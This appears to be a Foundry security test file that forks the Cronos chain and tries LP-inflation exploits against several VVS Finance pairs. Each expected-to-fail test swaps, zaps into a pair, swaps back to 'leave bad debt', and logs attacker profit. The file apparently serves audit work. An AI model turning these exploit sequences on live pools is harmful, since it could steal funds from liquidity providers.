// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VVS_Finance__common.sol";
import "flow/test_flow.sol";

contract ContractTest is CronosCommon {
    using SafeMath for uint256;

    // Configure target flashloan here
    address fl_token = address(USDC);
    uint256 constant req_flashloan_amount = 104_000 * 1e6;
    uint256 constant payback_fee_amount = (req_flashloan_amount * 1008) / 1000; // 0.8% fee

    function setUp() public {
        super.setUp2();

        cheats.createSelectFork("cronos", 8185555);

        // Pre-load tokens
        // writeTokenBalance(address(this), fl_token, payback_fee_amount);
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_WETH_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_WETH_Pair__LP__WETH_Based() public {
        // Approval
        WCRO_WETH_Pair.approve(address(this), type(uint256).max);

        WCRO.approve(address(Zap), type(uint256).max);
        WCRO.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);

        WCRO.approve(address(this), type(uint256).max);
        WETH.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 1_000 * 1e18;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(WETH), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker WETH balance before exploit",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        // Convert WETH to WCRO
        WETH_to_WCRO(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = WCRO_WETH_Pair.getReserves();
        // console.log(
        //     "[Start] WCRO_WETH_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: WCRO.balanceOf(address(this)) * 99 / 100}(
            address(WCRO_WETH_Pair),
            1
        );

        // Leaving bad debt for WCRO_WETH_Pair
        WCRO_to_WETH(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker WETH balance after exploit",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in WETH",
            WETH.balanceOf(address(this)).sub(account_deposit_amount),
            WETH.decimals()
        );
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WBTC_WCRO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WBTC_WCRO_Pair__LP__USDC_Based() public {
        // Approval
        WBTC_WCRO_Pair.approve(address(this), type(uint256).max);

        WBTC.approve(address(Zap), type(uint256).max);
        WBTC.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        WBTC.approve(address(this), type(uint256).max);
        WCRO.approve(address(this), type(uint256).max);
        USDC.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 443 * 1e9;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker USDC balance before exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        // Convert USDC to WBTC
        USDC_to_WBTC(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = WBTC_WCRO_Pair.getReserves();
        // console.log(
        //     "[Start] WBTC_WCRO_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: WBTC.balanceOf(address(this)) * 99 / 100}(
            address(WBTC_WCRO_Pair),
            1
        );

        // Leaving bad debt for WBTC_WCRO_Pair
        WBTC_to_USDC(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in USDC",
            USDC.balanceOf(address(this)).sub(account_deposit_amount),
            USDC.decimals()
        );
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_USDC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_USDC_Pair__LP() public {
        // Approval
        WCRO_USDC_Pair.approve(address(this), type(uint256).max);

        WCRO.approve(address(Zap), type(uint256).max);
        WCRO.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        WCRO.approve(address(this), type(uint256).max);
        USDC.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 443 * 1e9;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker USDC balance before exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        // Convert USDC to WCRO
        USDC_to_WCRO(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = WCRO_USDC_Pair.getReserves();
        // console.log(
        //     "[Start] WCRO_USDC_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: WCRO.balanceOf(address(this)) * 99 / 100}(
            address(WCRO_USDC_Pair),
            1
        );

        // Leaving bad debt for WCRO_USDC_Pair
        WCRO_to_USDC(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in USDC",
            USDC.balanceOf(address(this)).sub(account_deposit_amount),
            USDC.decimals()
        );
    }

    // --------------------------------------------------------------------------------------------
    // Inflated USDT_USDC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_USDT_USDC_Pair__LP() public {
        // Approval
        USDT_USDC_Pair.approve(address(this), type(uint256).max);

        USDT.approve(address(Zap), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        USDT.approve(address(this), type(uint256).max);
        USDC.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 374_464 * 1e9;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker USDC balance before exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        // Convert USDC to USDT
        USDC_to_USDT(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = USDT_USDC_Pair.getReserves();
        // console.log(
        //     "[Start] USDT_USDC_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: USDT.balanceOf(address(this)) * 99 / 100}(
            address(USDT_USDC_Pair),
            1
        );

        // Leaving bad debt for USDT_USDC_Pair
        USDT_to_USDC(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in USDC",
            USDC.balanceOf(address(this)).sub(account_deposit_amount),
            USDC.decimals()
        );
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_USDT_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_USDT_Pair__LP() public {
        // Approval
        WCRO_USDT_Pair.approve(address(this), type(uint256).max);

        WCRO.approve(address(Zap), type(uint256).max);
        WCRO.approve(address(Router), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);

        WCRO.approve(address(this), type(uint256).max);
        USDT.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 600 * 1e9;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(USDT), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        // Convert USDT to WCRO
        USDT_to_WCRO(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = WCRO_USDT_Pair.getReserves();
        // console.log(
        //     "[Start] WCRO_USDT_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: WCRO.balanceOf(address(this)) * 99 / 100}(
            address(WCRO_USDT_Pair),
            1
        );

        // Leaving bad debt for WCRO_USDT_Pair
        WCRO_to_USDT(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in USDT",
            USDT.balanceOf(address(this)).sub(account_deposit_amount),
            USDT.decimals()
        );
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_DAI_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_DAI_Pair__LP() public {
        // Approval
        WCRO_DAI_Pair.approve(address(this), type(uint256).max);

        WCRO.approve(address(Zap), type(uint256).max);
        WCRO.approve(address(Router), type(uint256).max);
        DAI.approve(address(Router), type(uint256).max);

        WCRO.approve(address(this), type(uint256).max);
        DAI.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 1_000_000_000 * 1e18;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(DAI), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker DAI balance before exploit",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        // Convert DAI to WCRO
        DAI_to_WCRO(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = WCRO_DAI_Pair.getReserves();
        // console.log(
        //     "[Start] WCRO_DAI_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: WCRO.balanceOf(address(this)) * 99 / 100}(
            address(WCRO_DAI_Pair),
            1
        );

        // Leaving bad debt for WCRO_DAI_Pair
        WCRO_to_DAI(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker DAI balance after exploit",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in DAI",
            DAI.balanceOf(address(this)).sub(account_deposit_amount),
            DAI.decimals()
        );
    }

    // --------------------------------------------------------------------------------------------
    // Inflated USDC_TONIC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_USDC_TONIC_Pair__LP() public {
        // Approval
        USDC_TONIC_Pair.approve(address(this), type(uint256).max);

        USDC.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);

        USDC.approve(address(this), type(uint256).max);
        USDT.approve(address(this), type(uint256).max);
        TONIC.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 1_000 * 1e15;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(USDT), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        // Convert USDT to USDC
        USDT_to_USDC(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = USDC_TONIC_Pair.getReserves();
        // console.log(
        //     "[Start] USDC_TONIC_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: USDC.balanceOf(address(this)) * 99 / 100}(
            address(USDC_TONIC_Pair),
            1
        );

        // Leaving bad debt for USDC_TONIC_Pair
        USDC_to_USDT(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in USDT",
            USDT.balanceOf(address(this)).sub(account_deposit_amount),
            USDT.decimals()
        );
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_TONIC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_TONIC_Pair__LP() public {
        // Approval
        WCRO_TONIC_Pair.approve(address(this), type(uint256).max);

        WCRO.approve(address(Zap), type(uint256).max);
        WCRO.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        WCRO.approve(address(this), type(uint256).max);
        USDC.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 600 * 1e9;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker USDC balance before exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        // Convert USDC to WCRO
        USDC_to_WCRO(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = WCRO_TONIC_Pair.getReserves();
        // console.log(
        //     "[Start] WCRO_TONIC_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: WCRO.balanceOf(address(this)) * 99 / 100}(
            address(WCRO_TONIC_Pair),
            1
        );

        // Leaving bad debt for WCRO_TONIC_Pair
        WCRO_to_USDC(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in USDC",
            USDC.balanceOf(address(this)).sub(account_deposit_amount),
            USDC.decimals()
        );
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_TONIC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_TONIC_Pair__LP() public {
        // Approval
        VVS_TONIC_Pair.approve(address(this), type(uint256).max);

        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        VVS.approve(address(this), type(uint256).max);
        USDC.approve(address(this), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = 443 * 1e9;
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker USDC balance before exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        // emit log_named_decimal_uint(
        //     "[Start] price0CumulativeLast() before exploit",
        //     VVS_TONIC_Pair.price0CumulativeLast(),
        //     VVS_TONIC_Pair.decimals()
        // );

        // emit log_named_decimal_uint(
        //     "[Start] price1CumulativeLast() before exploit",
        //     VVS_TONIC_Pair.price1CumulativeLast(),
        //     VVS_TONIC_Pair.decimals()
        // );

        // Convert USDC to VVS
        USDC_to_VVS(type(uint256).max);

        // Uncomment to view the reserves
        // uint112 reserve0;
        // uint112 reserve1;
        // uint32 blockTimestampLast;
        // (reserve0, reserve1, blockTimestampLast) = VVS_TONIC_Pair.getReserves();
        // console.log(
        //     "[Start] VVS_TONIC_Pair reserve0: %d, reserve1: %d, blockTimestampLast: %d",
        //     reserve0,
        //     reserve1,
        //     blockTimestampLast
        // );

        // Deposit token(s) into Pair LP
        Zap.zapIn{value: VVS.balanceOf(address(this)) * 99 / 100}(
            address(VVS_TONIC_Pair),
            1
        );

        // emit log_named_decimal_uint(
        //     "[End] price0CumulativeLast() before exploit",
        //     VVS_TONIC_Pair.price0CumulativeLast(),
        //     VVS_TONIC_Pair.decimals()
        // );

        // emit log_named_decimal_uint(
        //     "[End] price1CumulativeLast() before exploit",
        //     VVS_TONIC_Pair.price1CumulativeLast(),
        //     VVS_TONIC_Pair.decimals()
        // );

        // Leaving bad debt for VVS_TONIC_Pair
        VVS_to_USDC(type(uint256).max);

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        console.log("---------------------------------------------------------------------");
        emit log_named_decimal_uint(
            "Attacker Profit in USDC",
            USDC.balanceOf(address(this)).sub(account_deposit_amount),
            USDC.decimals()
        );
    }
}
